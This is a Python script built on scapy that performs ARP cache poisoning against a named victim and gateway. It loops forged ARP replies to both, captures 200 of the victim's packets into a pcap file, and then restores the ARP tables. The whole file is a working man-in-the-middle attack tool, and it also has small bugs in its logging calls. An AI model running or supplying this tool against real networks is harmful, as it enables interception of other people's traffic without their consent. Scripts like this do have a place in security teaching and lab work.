#Linux: `echo 1 > /proc/sys/net/ipv4/ip_forward`

import logging
import sys
import time
from multiprocessing import Process

from scapy.all import (
    ARP,
    Ether,
    Packet,
    conf,
    get_if_hwaddr,
    send,
    sndrcv,
    sniff,
    srp,
    wrpcap,
)

logging.basicConfig(format='%(asctime)s | %(levelname)s | %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

def get_mac(target_ip) -> str|None:
    packet : Packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=target_ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

def set_poison(ipv4_src:str, ipv4_dest:str, mac_dest:str|None) -> ARP:
    poisoned : ARP = ARP()
    poisoned.op = 2
    poisoned.psrc = ipv4_src
    poisoned.pdst = ipv4_dest
    poisoned.hwdst = mac_dest

    logger.info(f'ip src: {poisoned.psrc}',
    f'ip dst: {poisoned.pdst}',
    f'mac dst: {poisoned.hwdst}',
    f'mac src: {poisoned.hwsrc}',
    poisoned.summary(),
    '-' * 30)

    return poisoned

def send_arp(poison_victim:ARP, poison_gateway:ARP) -> None:
    while True:
        sys.stdout.write('.')
        sys.stdout.flush()
        try:
            send(poison_victim)
            send(poison_gateway)
        except KeyboardInterrupt:
            return
        else:
            time.sleep(2)

class Arper:
    def __init__(self, victim:str, gateway:str, interface:str ='en0') -> None:
        self.interface : str = interface
        conf.iface = interface
        conf.verb = 0
        self.victim : str = victim
        self.victimmac : str|None = get_mac(victim)
        self.gateway : str  = gateway
        self.gatewaymac : str|None = get_mac(gateway)

        logger.info(f'Initialized {interface}:',
        f'Gateway ({gateway}) is at ({self.gatewaymac}).',
        f'Gateway ({victim}) is at ({self.victimmac}).',
        '-' * 30)

    def run(self) -> None:
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniffer)
        self.sniff_thread.start()

    def poison(self) -> None:
        poison_victim : ARP = set_poison(
            ipv4_src=self.gateway,
            ipv4_dest=self.victim,
            mac_dest=self.victimmac
        )

        poison_gateway : ARP = set_poison(
            ipv4_src=self.victim,
            ipv4_dest=self.gateway,
            mac_dest=self.gatewaymac
        )

        logger.info('Beginning the ARP poison. [CTRL-C] to stop!')

        send_arp(poison_victim, poison_gateway)

    def sniffer(self, count=200) -> None:
        time.sleep(5)
        print(f'Sniffing {count} packets.')

        bpf_filter = f'ip host {self.victim}'

        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)

        wrpcap('arper.pcap', packets)
        logger.info('Got the packets!')

        self.restore()
        self.poison_thread.terminate()
        logger.info('Finished!')

    def restore(self):
        logger.info('Restoring ARP tables...')
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)

def main() -> None:
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()


if __name__ == '__main__':
    main()
